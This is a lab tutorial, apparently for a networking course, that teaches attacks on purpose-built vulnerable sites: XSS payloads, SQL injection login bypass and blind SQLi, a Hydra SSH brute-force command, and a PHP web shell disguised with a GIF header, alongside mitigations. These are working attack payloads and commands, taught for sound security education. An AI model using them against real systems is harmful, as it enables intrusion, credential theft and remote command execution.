# Linux-side XSS & Web Vulnerabilities — Step-by-Step Tutorial (Lab)

> **Scope / warning:** These steps are for your controlled lab VM only (e.g., `xxs.local`, `sqlinjection.local`, `fileupload.local`, `192.168.x.y`). Do **not** run or test against systems you don't own or explicitly have permission to test. This is a teaching lab — follow ethical rules and your course supervisor's instructions.

---

## Table of contents
1. Pre-lab checks  
2. Reflected XSS (interactive input + URL)  
3. Stored / HTML injection (comment board)  
4. SQL injection — login bypass  
5. SSH brute-force (lab demonstration)  
6. File upload → web shell (upload + trigger)  
7. Quick mitigations (per vulnerability)  
8. Lab checklist & reporting  
9. Appendix — common payloads & commands

---

## 1) Pre-lab checks (one-time)
1. Boot the target Linux VM and ensure networking between your attacker machine (Kali) and the VM.  
2. Confirm target hostnames resolve (either via `/etc/hosts` or lab DNS):
   - `xxs.local` → XSS demo site  
   - `sqlinjection.local` → SQLi demo site  
   - `fileupload.local` → Upload demo site  
3. From Kali (attacker), verify connectivity:
```bash
ping -c 2 xxs.local  
curl -I http://xxs.local/
```  
4. Open the target in your browser (use the lab's browser or your host machine if port forwarding is set up).  
5. Snapshot the VM before starting exercises so you can revert.

---

## 2) Reflected XSS — step-by-step
**Goal:** Demonstrate that user input is reflected and executed when loaded (proof of reflected XSS).

### 2.1 Inspect the page
1. Open `http://xxs.local/` in a browser.  
2. Locate the input field used by the app (comment box, search bar, etc.). Note whether input is submitted via GET (URL) or POST.

### 2.2 Normal input (confirm baseline)
1. Enter `My Comment!` into the input box.  
![Comment Box Input](/31261-internetworking/lab/01-Linux-VM/screenshots/xss-2.png)  
2. Click **Submit / Post**.  
3. Verify the page reloads and shows `My Comment!` rendered as plain text.

**Expected:** Comment appears as text — normal functionality.

### 2.3 Malicious input (payload)
1. In the same input, enter the following payload exactly (paste into the comment/search box):
```html
<script>alert(1);</script>
```
2. Click **Submit / Post**.

**Expected:** Instead of showing the text, the browser will execute the script. In our instance, a small alert pop-up box appears with the number '1' inside. This happens because the website is not sanitising or escaping user input. It's treating what we type as plain text and inserting it directly into the HTML page. The alert is actually harmless however, it proves that the website is vulnerable to XSS. The key indicator is that `<script>` tags execute — vulnerability confirmed.

> If the lab blocks outgoing requests, use a benign proof payload:
```html
<script>alert(1)</script>
```

### 2.4 Reflected via URL (GET)
If the input is reflected in the URL (e.g., a search query), craft a URL and visit it:
```php-template
http://xxs.local/search?q=<script>alert('XSS')</script>
```

1. Paste that link into the browser address bar and press Enter.  
2. If the page shows an alert or executes code, the site is vulnerable to reflected XSS.

**Why this works (brief):** The server injects user-supplied input into returned HTML without encoding, so the browser executes it.

---

## 3) Stored / HTML injection (comment board) — step-by-step
**Goal:** Store a payload that executes when other users view the page (persistent XSS).

### 3.1 Post a stored payload
1. On the comments page, enter:
```html
<script>alert('Stored XSS')</script>
```
2. Click **Post**.

### 3.2 Verify as another user
1. Open the page in a different browser or an incognito/private window.  
2. Reload the comments page and observe whether the alert runs.

**Expected:** When another user loads the comments page, the script executes. That is Stored XSS.

### 3.3 HTML injection (non-script)
1. Input:
```html
<h1>bold comment!</h1>
```
2. Click **Post**.

**Expected:** The comment displays as a large `<h1>` heading — the server did not escape tags.

**Notes:** Stored XSS is often more impactful than reflected XSS because it executes for any user that views the stored data (moderators, admins).

---

## 4) SQL injection — login bypass (step-by-step)
**Goal:** Demonstrate a basic authentication bypass using a simple SQL injection payload.

### 4.1 Visit the login page
1. Open `http://sqlinjection.local/` with the login form visible.

### 4.2 Try a normal failing login
1. Enter an invalid username and password (e.g., `noone` / `wrong`).  
2. Observe the error message (e.g., `Invalid username or password`).

### 4.3 Bypass with payload
1. In the **Username** field enter:
```vbnet
admin' OR 1=1--
```
2. Leave the password blank and click **Login**.

**What happens:** If the application constructs a SQL query like:
```sql
SELECT * FROM users WHERE username = 'USERNAME' AND password = 'PASSWORD';
```  
the injected `OR 1=1` makes the WHERE clause always true and `--` comments out the remainder, allowing authentication bypass.

### 4.4 Alternate techniques
- `admin' --`  
- `' OR '1'='1`  
- `UNION SELECT` for pages that return query results (only use read-only tests).

### 4.5 Blind SQLi (time-based)
If the app doesn't show DB output, use time-based payloads to infer data:
```sql
' OR IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--
```

A measurable delay indicates the condition evaluated true.

**Important:** Stay non-destructive, document findings, and revert the VM snapshot if necessary.

---

## 5) SSH Brute‑Force (demo using Hydra)
**Goal:** Show how weak credentials are easily discovered and why rate-limiting / MFA is necessary.

### 5.1 Wordlists on Kali
Useful wordlists:
```swift
/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt    
/usr/share/wordlists/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt
```

### 5.2 Run Hydra (lab example target `192.168.1.117`)
Example command (adjust target IP):
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt ssh://192.168.1.117 -t 4
```

Parameters:
- `-L` username list  
- `-P` password list  
- `-t` parallel tasks (threads)

### 5.3 Interpreting results
- Hydra prints matches like `admin:P@ssw0rd` if found.  
- Use `ssh admin@192.168.1.117` to log in with discovered credentials (lab only).

**Mitigations:** Enforce strong passwords, remove default accounts, use SSH keys, enable fail2ban and rate-limiting, and enforce MFA.

---

## 6) File upload → web shell (step-by-step)
**Goal:** Demonstrate how insecure file upload checks can yield remote command execution (RCE) in the web server context.

### 6.1 Key concepts (brief)
- **Magic bytes:** File headers that reliably identify file types (e.g., GIF: `GIF89a`, PNG: `\x89PNG...`).  
- **Double-extension:** Filenames like `shell.png.php` can bypass naive checks.  
- **Webroot execution:** If uploads are stored in `/var/www/html/Uploads/` and PHP executes `.php` files, uploaded PHP can run.

### 6.2 Create the malicious payload (on attacker)
Create `shell.png.php` containing a fake GIF header followed by PHP:
```php
GIF89a<?php system($_GET['cmd']); ?>
```

On Kali:
```bash
cat > shell.png.php <<'EOF'  
GIF89a<?php system($_GET['cmd']); ?>  
EOF
```

(Use the above as a single command or create the file in your editor.)

### 6.3 Upload via the web form
1. Open `http://fileupload.local/`.  
2. Use the upload field to upload `shell.png.php`.  
3. Observe the site responds `file upload successful` (or similar).

### 6.4 Trigger the web shell
Access the uploaded file with a command parameter:
```bash
http://fileupload.local/Uploads/shell.png.php?cmd=id
```

The response should contain output like:
- `uid=33(www-data) gid=33(www-data)`

**Why it worked:** The server accepted `shell.png.php` (naive `.png` check), stored it in a web-accessible directory, and the PHP interpreter executed the `<?php` block.

### 6.5 Post-exploit notes
- Commands run as the web server user (e.g., `www-data`).  
- Use `curl 'http://fileupload.local/Uploads/shell.png.php?cmd=whoami'` for scripted checks.  
- Do not attempt privilege escalation or lateral movement beyond lab scope.

---

## 7) Quick mitigations (practical)
- **XSS (Reflected / Stored / DOM):**
  - Output-encode data by context (HTML entity encoding).  
  - Use templating engines that auto-escape.  
  - Avoid `innerHTML` and `document.write`. Sanitize allowed HTML server-side.  
  - Implement a strict Content Security Policy (CSP) and set cookies to `HttpOnly` & `Secure`.

- **SQL Injection:**
  - Use parameterised queries / prepared statements.  
  - Limit DB user privileges and suppress detailed SQL errors in production.  
  - Validate and normalise inputs; apply least-privilege access.

- **Brute-force / Credential attacks:**
  - Enforce strong password policies, enable MFA.  
  - Use account lockouts, rate-limiting, and monitoring (fail2ban).  
  - Disable password auth for SSH; prefer keys only.

- **File upload:**
  - Validate by extension and magic bytes; verify server-side MIME type.  
  - Rename and store uploads outside the webroot; remove execute permissions.  
  - Scan uploads with AV/ClamAV; disallow execution in upload directories.

---

## 8) Lab checklist & reporting
For each exercise, capture:
- Screenshot of baseline (normal input working).  
- Screenshot proving exploit (alert box, shell output, bypassed login).  
- Terminal command history for tools used (Hydra, curl, etc.).  
- Short analysis: root cause (code/config), why it worked, and suggested fix.  
- Revert VM to snapshot after tests.

---

## 9) Appendix — common payloads & quick commands
```text
**Reflected XSS proof:**  
<script>alert('XSS')</script>

**SQLi login bypass example:**  
admin' OR 1=1--

**Hydra example (SSH):**  
hydra -L top-usernames-shortlist.txt -P 2020-200_most_used_passwords.txt ssh://192.168.1.117 -t 4

**Web shell trigger:**  
http://fileupload.local/Uploads/shell.png.php?cmd=id
```

---

## Final notes — safe experimentation
- Reproduce carefully and document every step.  
- Reset the VM between groups or revert to a snapshot after testing.  
- Always include responsible disclosure language when testing anything outside this lab.  
- If you want a one-page printable quick reference or a PDF-ready plain-text version, I can convert this for you.

